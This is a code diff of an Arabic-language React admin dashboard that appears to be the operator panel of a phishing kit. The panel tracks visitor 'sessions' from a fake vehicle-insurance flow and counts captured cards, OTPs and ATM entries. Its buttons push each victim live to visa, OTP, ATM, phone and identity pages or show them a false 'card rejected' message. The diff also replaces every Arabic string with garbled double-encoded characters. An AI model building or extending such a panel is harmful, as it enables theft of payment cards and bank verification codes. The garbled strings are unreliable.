                   onClick={() => void handleControl("go_visa")}
                   className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_visa" ? "...جارٍ" : "💳 الفيزا"}</button>
+                >{loadingAction === "go_visa" ? "...ÃÂ¬ÃÂ§ÃÂ±ÃÂ" : "Ã°ÂÂÂ³ ÃÂ§ÃÂÃÂÃÂÃÂ²ÃÂ§"}</button>
               </div>
               
-              <p className="text-[10px] text-slate-400 font-semibold pt-2">التوجيه لـ</p>
+              <p className="text-[10px] text-slate-400 font-semibold pt-2">ÃÂ§ÃÂÃÂªÃÂÃÂ¬ÃÂÃÂ ÃÂÃÂ</p>
               <div className="grid gap-2 sm:grid-cols-4">
                 <button
                   type="button"
                   disabled={loadingAction === "go_otp"}
                   onClick={() => void handleControl("go_otp")}
                   className="rounded-2xl bg-green-600 px-2 py-2 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_otp" ? "..." : "🔐 OTP"}</button>
+                >{loadingAction === "go_otp" ? "..." : "Ã°ÂÂÂ OTP"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_nomer"}
                   onClick={() => void handleControl("go_nomer")}
                   className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_nomer" ? "..." : "📱 Nomer"}</button>
+                >{loadingAction === "go_nomer" ? "..." : "Ã°ÂÂÂ± Nomer"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_nomer_otp"}
                   onClick={() => void handleControl("go_nomer_otp")}
                   className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_nomer_otp" ? "..." : "📱 N-OTP"}</button>
+                >{loadingAction === "go_nomer_otp" ? "..." : "Ã°ÂÂÂ± N-OTP"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_identity_check"}
                   onClick={() => void handleControl("go_identity_check")}
                   className="rounded-2xl bg-purple-600 px-2 py-2 text-xs font-semibold text-white hover:bg-purple-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_identity_check" ? "..." : "🆔 هوية"}</button>
+                >{loadingAction === "go_identity_check" ? "..." : "Ã°ÂÂÂ ÃÂÃÂÃÂÃÂ©"}</button>
               </div>
               
-              <p className="text-[10px] text-slate-400 font-semibold pt-2">قائمة الانتظار</p>
+              <p className="text-[10px] text-slate-400 font-semibold pt-2">ÃÂÃÂ§ÃÂ¦ÃÂÃÂ© ÃÂ§ÃÂÃÂ§ÃÂÃÂªÃÂ¸ÃÂ§ÃÂ±</p>
               <div className="grid gap-2">
                 <button
                   type="button"
                   disabled={loadingAction === "go_waiting"}
                   onClick={() => void handleControl("go_waiting")}
                   className="rounded-2xl bg-amber-600 px-3 py-2 text-xs font-semibold text-white hover:bg-amber-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_waiting" ? "...جارٍ" : "⏳ قائمة الانتظار"}</button>
+                >{loadingAction === "go_waiting" ? "..." : "⏳ قائمة الانتظار"}</button>
               </div>
               
-              <p className="text-[10px] text-slate-400 font-semibold pt-2">خطأ</p>
+              <p className="text-[10px] text-slate-400 font-semibold pt-2">ÃÂ®ÃÂ·ÃÂ£</p>
               <div className="grid gap-2">
                 <button
                   type="button"
                   disabled={loadingAction === "card_error"}
                   onClick={() => void handleControl("card_error")}
                   className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "card_error" ? "..." : "❌ خطأ البطاقة"}</button>
+                >{loadingAction === "card_error" ? "..." : "Ã¢ÂÂ ÃÂ®ÃÂ·ÃÂ£ ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©"}</button>
               </div>
             </div>
           </div>
         )}
         
-        {/* التاريخي / الأرشيف Section */}
+        {/* ÃÂ§ÃÂÃÂªÃÂ§ÃÂ±ÃÂÃÂ®ÃÂ / ÃÂ§ÃÂÃÂ£ÃÂ±ÃÂ´ÃÂÃÂ Section */}
         <div className="border-t border-slate-100">
           <button
             type="button"
@@ -582,7 +582,7 @@ function SessionBox({
           >
             <span className="flex items-center gap-2">
               <Clock className="w-3 h-3" />
-              السجل التاريخي ({rows.length} سجل)
+              ÃÂ§ÃÂÃÂ³ÃÂ¬ÃÂ ÃÂ§ÃÂÃÂªÃÂ§ÃÂ±ÃÂÃÂ®ÃÂ ({rows.length} ÃÂ³ÃÂ¬ÃÂ)
             </span>
             {historyExpanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
           </button>
@@ -615,11 +615,11 @@ function SessionBox({
                         <span className={`font-bold ${isLatest ? "text-blue-700" : "text-slate-700"}`}>
                           {getTypeArabic(row.type)}
                         </span>
-                        {isLatest && <span className="text-[9px] bg-blue-200 text-blue-800 px-1.5 py-0.5 rounded font-semibold">الأحدث</span>}
+                        {isLatest && <span className="text-[9px] bg-blue-200 text-blue-800 px-1.5 py-0.5 rounded font-semibold">ÃÂ§ÃÂÃÂ£ÃÂ­ÃÂ¯ÃÂ«</span>}
                       </div>
                       <div className="flex items-center gap-2 text-slate-400">
                         <span className="text-[10px]">{formatTimeCounter(row.createdAt)}</span>
-                        <span className="text-[9px]">•</span>
+                        <span className="text-[9px]">Ã¢ÂÂ¢</span>
                         <span className="text-[9px]">#{row.id}</span>
                       </div>
                     </div>
@@ -759,16 +759,16 @@ export default function AdminDashboard() {
     const token = getToken();
     if (!token) return;
     if (!passwordValue.trim()) {
-      setPasswordStatus("أدخل كلمة مرور جديدة");
+      setPasswordStatus("ÃÂ£ÃÂ¯ÃÂ®ÃÂ ÃÂÃÂÃÂÃÂ© ÃÂÃÂ±ÃÂÃÂ± ÃÂ¬ÃÂ¯ÃÂÃÂ¯ÃÂ©");
       return;
     }
     try {
       await adminChangePassword(token, passwordValue.trim());
-      setPasswordStatus("تم تغيير كلمة المرور بنجاح.");
+      setPasswordStatus("ÃÂªÃÂ ÃÂªÃÂºÃÂÃÂÃÂ± ÃÂÃÂÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ± ÃÂ¨ÃÂÃÂ¬ÃÂ§ÃÂ­.");
       setPasswordValue("");
     } catch (error) {
       console.error(error);
-      setPasswordStatus("فشل تغيير كلمة المرور.");
+      setPasswordStatus("ÃÂÃÂ´ÃÂ ÃÂªÃÂºÃÂÃÂÃÂ± ÃÂÃÂÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ±.");
     }
   }, [passwordValue]);
 
@@ -778,7 +778,7 @@ export default function AdminDashboard() {
   }, [settings]);
 
   const handleBlock = useCallback((sessionId: string, ownerName?: string) => {
-    blockSession(sessionId, ownerName, "محظور بواسطة الإدارة");
+    blockSession(sessionId, ownerName, "ÃÂÃÂ­ÃÂ¸ÃÂÃÂ± ÃÂ¨ÃÂÃÂ§ÃÂ³ÃÂ·ÃÂ© ÃÂ§ÃÂÃÂ¥ÃÂ¯ÃÂ§ÃÂ±ÃÂ©");
     setBlockedSessions(getBlockedSessions());
   }, []);
 
@@ -826,7 +826,7 @@ export default function AdminDashboard() {
   const handleControlAction = useCallback(async (sessionId: string, action: string, code?: string) => {
     const token = getToken();
     if (!token) {
-      toast("error", "خطأ في التوثيق", "لم يتم العثور على رمز الدخول");
+      toast("error", "ÃÂ®ÃÂ·ÃÂ£ ÃÂÃÂ ÃÂ§ÃÂÃÂªÃÂÃÂ«ÃÂÃÂ", "ÃÂÃÂ ÃÂÃÂªÃÂ ÃÂ§ÃÂÃÂ¹ÃÂ«ÃÂÃÂ± ÃÂ¹ÃÂÃÂ ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂ¯ÃÂ®ÃÂÃÂ");
       return;
     }
     
@@ -835,38 +835,38 @@ export default function AdminDashboard() {
       
       // Map action to page name for display
       const pageNames: Record<string, string> = {
-        go_home: "الصفحة الرئيسية",
-        go_form: "بيانات المركبة",
-        go_select: "اختيار التأمين",
-        go_visa: "صفحة الفيزا",
-        go_otp: "صفحة OTP",
-        go_otp2: "صفحة OTP 2",
-        go_otp3: "صفحة OTP 3",
-        go_atm: "صفحة ATM",
-        go_nomer: "رقم الجوال",
-        go_nomer_wait: "انتظار رقم الجوال",
-        go_nomer_otp: "تحقق رقم الجوال",
-        go_identity_check: "التحقق من الهوية",
-        go_total: "الإجمالي",
-        go_total2: "الإجمالي 2",
-        go_waiting: "قائمة الانتظار",
-        card_error: "إبلاغ خطأ البطاقة",
-        nomer_error: "إبلاغ خطأ الرقم",
-        identity_code: "إرسال رمز الهوية",
+        go_home: "ÃÂ§ÃÂÃÂµÃÂÃÂ­ÃÂ© ÃÂ§ÃÂÃÂ±ÃÂ¦ÃÂÃÂ³ÃÂÃÂ©",
+        go_form: "ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ¨ÃÂ©",
+        go_select: "ÃÂ§ÃÂ®ÃÂªÃÂÃÂ§ÃÂ± ÃÂ§ÃÂÃÂªÃÂ£ÃÂÃÂÃÂ",
+        go_visa: "ÃÂµÃÂÃÂ­ÃÂ© ÃÂ§ÃÂÃÂÃÂÃÂ²ÃÂ§",
+        go_otp: "ÃÂµÃÂÃÂ­ÃÂ© OTP",
+        go_otp2: "ÃÂµÃÂÃÂ­ÃÂ© OTP 2",
+        go_otp3: "ÃÂµÃÂÃÂ­ÃÂ© OTP 3",
+        go_atm: "ÃÂµÃÂÃÂ­ÃÂ© ATM",
+        go_nomer: "ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ",
+        go_nomer_wait: "ÃÂ§ÃÂÃÂªÃÂ¸ÃÂ§ÃÂ± ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ",
+        go_nomer_otp: "ÃÂªÃÂ­ÃÂÃÂ ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ",
+        go_identity_check: "ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂ©",
+        go_total: "ÃÂ§ÃÂÃÂ¥ÃÂ¬ÃÂÃÂ§ÃÂÃÂ",
+        go_total2: "ÃÂ§ÃÂÃÂ¥ÃÂ¬ÃÂÃÂ§ÃÂÃÂ 2",
+        go_waiting: "ÃÂÃÂ§ÃÂ¦ÃÂÃÂ© ÃÂ§ÃÂÃÂ§ÃÂÃÂªÃÂ¸ÃÂ§ÃÂ±",
+        card_error: "ÃÂ¥ÃÂ¨ÃÂÃÂ§ÃÂº ÃÂ®ÃÂ·ÃÂ£ ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©",
+        nomer_error: "ÃÂ¥ÃÂ¨ÃÂÃÂ§ÃÂº ÃÂ®ÃÂ·ÃÂ£ ÃÂ§ÃÂÃÂ±ÃÂÃÂ",
+        identity_code: "ÃÂ¥ÃÂ±ÃÂ³ÃÂ§ÃÂ ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂÃÂÃÂÃÂ©",
       };
       
       const pageName = pageNames[action] || action;
       
       if (result.success) {
         if (action === "card_error") {
-          toast("success", "تم إرسال إشعار الخطأ", "تم إبلاغ العميل بأن البطاقة مرفوضة");
+          toast("success", "ÃÂªÃÂ ÃÂ¥ÃÂ±ÃÂ³ÃÂ§ÃÂ ÃÂ¥ÃÂ´ÃÂ¹ÃÂ§ÃÂ± ÃÂ§ÃÂÃÂ®ÃÂ·ÃÂ£", "ÃÂªÃÂ ÃÂ¥ÃÂ¨ÃÂÃÂ§ÃÂº ÃÂ§ÃÂÃÂ¹ÃÂÃÂÃÂ ÃÂ¨ÃÂ£ÃÂ ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ© ÃÂÃÂ±ÃÂÃÂÃÂ¶ÃÂ©");
         } else {
-          toast("success", "تم تحويل العميل", `تم التوجيه إلى: ${pageName}`);
+          toast("success", "ÃÂªÃÂ ÃÂªÃÂ­ÃÂÃÂÃÂ ÃÂ§ÃÂÃÂ¹ÃÂÃÂÃÂ", `ÃÂªÃÂ ÃÂ§ÃÂÃÂªÃÂÃÂ¬ÃÂÃÂ ÃÂ¥ÃÂÃÂ: ${pageName}`);
         }
       }
     } catch (error) {
       console.error("Error sending control:", error);
-      toast("error", "خطأ في التنفيذ", "فشل في إرسال الأمر للخادم");
+      toast("error", "ÃÂ®ÃÂ·ÃÂ£ ÃÂÃÂ ÃÂ§ÃÂÃÂªÃÂÃÂÃÂÃÂ°", "ÃÂÃÂ´ÃÂ ÃÂÃÂ ÃÂ¥ÃÂ±ÃÂ³ÃÂ§ÃÂ ÃÂ§ÃÂÃÂ£ÃÂÃÂ± ÃÂÃÂÃÂ®ÃÂ§ÃÂ¯ÃÂ");
     }
     
     await fetchData();
@@ -890,31 +890,31 @@ export default function AdminDashboard() {
             <div className="space-y-2 text-right">
               <div className="flex flex-wrap items-center gap-2 text-lg font-bold text-slate-900">
                 <ShieldCheck className="h-5 w-5 text-blue-600" />
-                لوحة التحكم الإدارية
+                ÃÂÃÂÃÂ­ÃÂ© ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ ÃÂ§ÃÂÃÂ¥ÃÂ¯ÃÂ§ÃÂ±ÃÂÃÂ©
               </div>
-              <p className="text-sm text-slate-500">تواصل مع بيانات الجلسات من أي مكان، وأدر المستخدمين بسهولة.</p>
+              <p className="text-sm text-slate-500">ÃÂªÃÂÃÂ§ÃÂµÃÂ ÃÂÃÂ¹ ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ¬ÃÂÃÂ³ÃÂ§ÃÂª ÃÂÃÂ ÃÂ£ÃÂ ÃÂÃÂÃÂ§ÃÂÃÂ ÃÂÃÂ£ÃÂ¯ÃÂ± ÃÂ§ÃÂÃÂÃÂ³ÃÂªÃÂ®ÃÂ¯ÃÂÃÂÃÂ ÃÂ¨ÃÂ³ÃÂÃÂÃÂÃÂ©.</p>
             </div>
             <div className="flex flex-wrap items-center gap-2 justify-end">
-              <Button size="sm" variant="outline" onClick={fetchData}>تحديث</Button>
-              <Button size="sm" onClick={() => setSettingsOpen(true)}>إعدادات العروض</Button>
-              <Button size="sm" variant="secondary" onClick={() => setPasswordOpen(true)}>تغيير كلمة المرور</Button>
-              <Button size="sm" variant="destructive" onClick={handleLogoutAll}>خروج من كل الأجهزة</Button>
-              <Button size="sm" variant="ghost" onClick={handleLogout}>خروج</Button>
+              <Button size="sm" variant="outline" onClick={fetchData}>ÃÂªÃÂ­ÃÂ¯ÃÂÃÂ«</Button>
+              <Button size="sm" onClick={() => setSettingsOpen(true)}>ÃÂ¥ÃÂ¹ÃÂ¯ÃÂ§ÃÂ¯ÃÂ§ÃÂª ÃÂ§ÃÂÃÂ¹ÃÂ±ÃÂÃÂ¶</Button>
+              <Button size="sm" variant="secondary" onClick={() => setPasswordOpen(true)}>ÃÂªÃÂºÃÂÃÂÃÂ± ÃÂÃÂÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ±</Button>
+              <Button size="sm" variant="destructive" onClick={handleLogoutAll}>ÃÂ®ÃÂ±ÃÂÃÂ¬ ÃÂÃÂ ÃÂÃÂ ÃÂ§ÃÂÃÂ£ÃÂ¬ÃÂÃÂ²ÃÂ©</Button>
+              <Button size="sm" variant="ghost" onClick={handleLogout}>ÃÂ®ÃÂ±ÃÂÃÂ¬</Button>
             </div>
           </div>
 
           <div className="grid gap-3 sm:grid-cols-3">
             <div className="rounded-3xl border border-slate-200 bg-white p-4 text-right">
-              <div className="text-xs text-slate-500">الجلسات</div>
+              <div className="text-xs text-slate-500">ÃÂ§ÃÂÃÂ¬ÃÂÃÂ³ÃÂ§ÃÂª</div>
               <div className="mt-2 text-3xl font-bold text-slate-900">{sessionCount}</div>
             </div>
             <div className="rounded-3xl border border-slate-200 bg-white p-4 text-right">
-              <div className="text-xs text-slate-500">الإدخالات</div>
+              <div className="text-xs text-slate-500">ÃÂ§ÃÂÃÂ¥ÃÂ¯ÃÂ®ÃÂ§ÃÂÃÂ§ÃÂª</div>
               <div className="mt-2 text-3xl font-bold text-slate-900">{stats?.totalSubmissions ?? 0}</div>
             </div>
             <div className="rounded-3xl border border-slate-200 bg-white p-4 text-right">
               <div className="flex items-center justify-between text-xs text-slate-500">
-                <span>محظور / مهملات</span>
+                <span>ÃÂÃÂ­ÃÂ¸ÃÂÃÂ± / ÃÂÃÂÃÂÃÂÃÂ§ÃÂª</span>
                 <Badge className="bg-slate-100 text-slate-700">{blockedCount}</Badge>
               </div>
               <div className="mt-2 text-3xl font-bold text-slate-900">{trashedCount}</div>
@@ -925,22 +925,22 @@ export default function AdminDashboard() {
 
       <main className="mx-auto max-w-6xl px-4 py-6 sm:px-6 lg:px-8 space-y-6">
         <div className="grid gap-3 sm:grid-cols-4">
-          <StatCard label="البطاقات" value={cardCount} icon={<CreditCard className="w-4 h-4" />} color="bg-red-100 text-red-600" />
+          <StatCard label="ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ§ÃÂª" value={cardCount} icon={<CreditCard className="w-4 h-4" />} color="bg-red-100 text-red-600" />
           <StatCard label="OTP" value={otpCount} icon={<KeyRound className="w-4 h-4" />} color="bg-orange-100 text-orange-600" />
           <StatCard label="ATM" value={atmCount} icon={<Banknote className="w-4 h-4" />} color="bg-yellow-100 text-yellow-700" />
-          <StatCard label="قيد المتابعة" value={pendingCount} icon={<Clock className="w-4 h-4" />} color="bg-blue-100 text-blue-600" />
+          <StatCard label="ÃÂÃÂÃÂ¯ ÃÂ§ÃÂÃÂÃÂªÃÂ§ÃÂ¨ÃÂ¹ÃÂ©" value={pendingCount} icon={<Clock className="w-4 h-4" />} color="bg-blue-100 text-blue-600" />
         </div>
 
         <section className="rounded-3xl border border-slate-200 bg-white p-4">
           <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
             <div className="text-right">
-              <h2 className="text-lg font-semibold text-slate-900">الجلسات</h2>
-              <p className="text-sm text-slate-500">اختر جلسة للعمل عليها أو حظر مستخدم أو حذف الجلسة.</p>
+              <h2 className="text-lg font-semibold text-slate-900">ÃÂ§ÃÂÃÂ¬ÃÂÃÂ³ÃÂ§ÃÂª</h2>
+              <p className="text-sm text-slate-500">ÃÂ§ÃÂ®ÃÂªÃÂ± ÃÂ¬ÃÂÃÂ³ÃÂ© ÃÂÃÂÃÂ¹ÃÂÃÂ ÃÂ¹ÃÂÃÂÃÂÃÂ§ ÃÂ£ÃÂ ÃÂ­ÃÂ¸ÃÂ± ÃÂÃÂ³ÃÂªÃÂ®ÃÂ¯ÃÂ ÃÂ£ÃÂ ÃÂ­ÃÂ°ÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ³ÃÂ©.</p>
             </div>
             <div className="flex flex-wrap items-center gap-2 text-xs text-slate-500">
-              <span>{sessionCount} جلسة</span>
+              <span>{sessionCount} ÃÂ¬ÃÂÃÂ³ÃÂ©</span>
               <span>|</span>
-              <span>{cardCount} بطاقة</span>
+              <span>{cardCount} ÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©</span>
               <span>|</span>
               <span>{otpCount} OTP</span>
             </div>
@@ -948,7 +948,7 @@ export default function AdminDashboard() {
 
           {sessionCount === 0 ? (
             <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-10 text-center text-slate-500">
-              لا يوجد جلسات حالياً
+              ÃÂÃÂ§ ÃÂÃÂÃÂ¬ÃÂ¯ ÃÂ¬ÃÂÃÂ³ÃÂ§ÃÂª ÃÂ­ÃÂ§ÃÂÃÂÃÂ§ÃÂ
             </div>
           ) : (
             <div className="space-y-4">
@@ -964,16 +964,16 @@ export default function AdminDashboard() {
                       }}
                       className="h-4 w-4 rounded border-slate-300 text-blue-600"
                     />
-                    تحديد الكل
+                    ÃÂªÃÂ­ÃÂ¯ÃÂÃÂ¯ ÃÂ§ÃÂÃÂÃÂ
                   </label>
-                  <span>{selectedIds.length} محدد</span>
+                  <span>{selectedIds.length} ÃÂÃÂ­ÃÂ¯ÃÂ¯</span>
                 </div>
                 <button
                   type="button"
                   disabled={selectedIds.length === 0}
                   onClick={handleDeleteSelected}
                   className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
-                >نقل المحدد إلى المهملات</button>
+                >ÃÂÃÂÃÂ ÃÂ§ÃÂÃÂÃÂ­ÃÂ¯ÃÂ¯ ÃÂ¥ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂÃÂ§ÃÂª</button>
               </div>
               <div className="space-y-4">
                 {Object.entries(sessions).map(([sessionId, rows]) => (
@@ -1012,7 +1012,7 @@ export default function AdminDashboard() {
       <Dialog open={settingsOpen} onOpenChange={setSettingsOpen}>
         <DialogContent className="sm:max-w-[720px] max-h-[85vh] flex flex-col" dir="rtl">
           <DialogHeader>
-            <DialogTitle>إعدادات العروض</DialogTitle>
+            <DialogTitle>ÃÂ¥ÃÂ¹ÃÂ¯ÃÂ§ÃÂ¯ÃÂ§ÃÂª ÃÂ§ÃÂÃÂ¹ÃÂ±ÃÂÃÂ¶</DialogTitle>
           </DialogHeader>
           <ScrollArea className="flex-1 mt-4">
             <div className="space-y-4">
@@ -1021,7 +1021,7 @@ export default function AdminDashboard() {
                   <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                     <div>
                       <div className="text-sm font-semibold text-slate-900">{offer.name} ({offer.type})</div>
-                      <p className="text-xs text-slate-500">السعر الحالي</p>
+                      <p className="text-xs text-slate-500">ÃÂ§ÃÂÃÂ³ÃÂ¹ÃÂ± ÃÂ§ÃÂÃÂ­ÃÂ§ÃÂÃÂ</p>
                     </div>
                     <input
                       type="number"
@@ -1039,8 +1039,8 @@ export default function AdminDashboard() {
             </div>
           </ScrollArea>
           <div className="mt-4 flex flex-wrap justify-end gap-2">
-            <Button size="sm" variant="outline" onClick={() => setSettingsOpen(false)}>إلغاء</Button>
-            <Button size="sm" onClick={handleSaveSettings}>حفظ</Button>
+            <Button size="sm" variant="outline" onClick={() => setSettingsOpen(false)}>ÃÂ¥ÃÂÃÂºÃÂ§ÃÂ¡</Button>
+            <Button size="sm" onClick={handleSaveSettings}>ÃÂ­ÃÂÃÂ¸</Button>
           </div>
         </DialogContent>
       </Dialog>
@@ -1048,10 +1048,10 @@ export default function AdminDashboard() {
       <Dialog open={passwordOpen} onOpenChange={setPasswordOpen}>
         <DialogContent className="sm:max-w-[480px] max-h-[80vh] flex flex-col" dir="rtl">
           <DialogHeader>
-            <DialogTitle>تغيير كلمة المرور</DialogTitle>
+            <DialogTitle>ÃÂªÃÂºÃÂÃÂÃÂ± ÃÂÃÂÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ±</DialogTitle>
           </DialogHeader>
           <div className="space-y-4 mt-4">
-            <label className="block text-xs font-semibold text-slate-600">كلمة المرور الجديدة</label>
+            <label className="block text-xs font-semibold text-slate-600">ÃÂÃÂÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ± ÃÂ§ÃÂÃÂ¬ÃÂ¯ÃÂÃÂ¯ÃÂ©</label>
             <input
               type="password"
               value={passwordValue}
@@ -1060,8 +1060,8 @@ export default function AdminDashboard() {
             />
             {passwordStatus && <div className="text-xs text-slate-500">{passwordStatus}</div>}
             <div className="flex flex-wrap justify-end gap-2">
-              <Button size="sm" variant="outline" onClick={() => setPasswordOpen(false)}>إلغاء</Button>
-              <Button size="sm" onClick={handleChangePassword}>حفظ</Button>
+              <Button size="sm" variant="outline" onClick={() => setPasswordOpen(false)}>ÃÂ¥ÃÂÃÂºÃÂ§ÃÂ¡</Button>
+              <Button size="sm" onClick={handleChangePassword}>ÃÂ­ÃÂÃÂ¸</Button>
             </div>
           </div>
         </DialogContent>
@@ -1070,21 +1070,21 @@ export default function AdminDashboard() {
       <Dialog open={trashOpen} onOpenChange={setTrashOpen}>
         <DialogContent className="sm:max-w-[720px] max-h-[85vh] flex flex-col" dir="rtl">
           <DialogHeader>
-            <DialogTitle>سلة المهملات</DialogTitle>
+            <DialogTitle>ÃÂ³ÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂÃÂÃÂÃÂ§ÃÂª</DialogTitle>
           </DialogHeader>
           <div className="px-4 pb-4">
             <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
-              <p className="text-sm text-slate-600">يمكنك استعادة أو حذف العناصر نهائيًا.</p>
+              <p className="text-sm text-slate-600">ÃÂÃÂÃÂÃÂÃÂ ÃÂ§ÃÂ³ÃÂªÃÂ¹ÃÂ§ÃÂ¯ÃÂ© ÃÂ£ÃÂ ÃÂ­ÃÂ°ÃÂ ÃÂ§ÃÂÃÂ¹ÃÂÃÂ§ÃÂµÃÂ± ÃÂÃÂÃÂ§ÃÂ¦ÃÂÃÂÃÂ§.</p>
               <button
                 type="button"
                 onClick={handleEmptyTrash}
                 className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
-              >إفراغ المهملات</button>
+              >ÃÂ¥ÃÂÃÂ±ÃÂ§ÃÂº ÃÂ§ÃÂÃÂÃÂÃÂÃÂÃÂ§ÃÂª</button>
             </div>
           </div>
           <ScrollArea className="flex-1 px-4 pb-4">
             {trashItems.length === 0 ? (
-              <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-8 text-center text-slate-500">لا يوجد عناصر في المهملات</div>
+              <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-8 text-center text-slate-500">ÃÂÃÂ§ ÃÂÃÂÃÂ¬ÃÂ¯ ÃÂ¹ÃÂÃÂ§ÃÂµÃÂ± ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂÃÂ§ÃÂª</div>
             ) : (
               <div className="space-y-4">
                 {trashItems.map((item) => (
@@ -1092,24 +1092,24 @@ export default function AdminDashboard() {
                     <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                       <div className="text-right">
                         <p className="text-sm font-semibold text-slate-900">#{item.sessionId.slice(0, 8)}</p>
-                        <p className="text-xs text-slate-500">{item.type} • {formatAgo(item.deletedAt)}</p>
+                        <p className="text-xs text-slate-500">{item.type} Ã¢ÂÂ¢ {formatAgo(item.deletedAt)}</p>
                       </div>
                       <div className="flex flex-wrap gap-2">
                         <button
                           type="button"
                           onClick={() => handleRestoreTrash(item.id)}
                           className="rounded-3xl border border-blue-200 bg-blue-50 px-3 py-2 text-xs text-blue-700 hover:bg-blue-100"
-                        >استعادة</button>
+                        >ÃÂ§ÃÂ³ÃÂªÃÂ¹ÃÂ§ÃÂ¯ÃÂ©</button>
                         <button
                           type="button"
                           onClick={() => handleDeleteTrashItem(item.id)}
                           className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
-                        >حذف نهائي</button>
+                        >ÃÂ­ÃÂ°ÃÂ ÃÂÃÂÃÂ§ÃÂ¦ÃÂ</button>
                       </div>
                     </div>
                     <div className="mt-3 grid gap-2 sm:grid-cols-2 text-xs text-slate-500">
-                      <div>IP: {item.ipAddress ?? "غير معروف"}</div>
-                      <div>وقت الحذف: {new Date(item.deletedAt).toLocaleString("ar-EG")}</div>
+                      <div>IP: {item.ipAddress ?? "ÃÂºÃÂÃÂ± ÃÂÃÂ¹ÃÂ±ÃÂÃÂ"}</div>
+                      <div>ÃÂÃÂÃÂª ÃÂ§ÃÂÃÂ­ÃÂ°ÃÂ: {new Date(item.deletedAt).toLocaleString("ar-EG")}</div>
                     </div>
                   </div>
                 ))}
@@ -1117,7 +1117,7 @@ export default function AdminDashboard() {
             )}
           </ScrollArea>
           <div className="mt-4 flex justify-end gap-2 px-4 pb-4">
-            <Button size="sm" variant="outline" onClick={() => setTrashOpen(false)}>إغلاق</Button>
+            <Button size="sm" variant="outline" onClick={() => setTrashOpen(false)}>ÃÂ¥ÃÂºÃÂÃÂ§ÃÂ</Button>
           </div>
         </DialogContent>
       </Dialog>
